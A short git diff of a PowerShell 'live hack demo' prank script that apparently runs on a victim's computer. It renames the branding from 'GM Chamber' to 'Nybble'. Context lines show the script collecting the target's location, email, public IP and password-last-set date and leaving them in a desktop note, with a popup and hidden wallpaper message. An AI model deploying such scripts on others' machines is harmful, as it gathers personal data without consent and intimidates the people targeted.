@@ -393,7 +393,7 @@ if (!$Networks) { Write-Host "Trying ..."
 
 # this is the message that will be coded into the image you use as the wallpaper
 
-	$hiddenMessage = "GM Chamber Details :-)"
+	$hiddenMessage = " Details :-)"
 
 # this will be the name of the image you use as the wallpaper
 
@@ -610,7 +610,7 @@ Write-Host "Restarting sound drivers ..."
 
 # a popup will be displayed before freezing the script while waiting for the cursor to move to continue the script
 # else capslock light will blink as an indicator
-$popmessage = "Hello GM Chamber"
+$popmessage = "Hello Nybble"
 
 
 $readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)
@@ -679,7 +679,7 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "GM Chamber Live Hack Demo`n" + "`nYour Location: $GL`n" + "`nEmail Id: $setmail`n" + "`nYour Public IP: $PubIP`n" + "`nPassword Last Set: $pls`n" + "`nStay Protected!!`n" + "`nStay Compliant!!`n" + "`nStay Safe!!`n"
+$message = "Nybble Live Hack Demo`n" + "`nYour Location: $GL`n" + "`nEmail Id: $setmail`n" + "`nYour Public IP: $PubIP`n" + "`nPassword Last Set: $pls`n" + "`nStay Protected!!`n" + "`nStay Compliant!!`n" + "`nStay Safe!!`n"
 
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
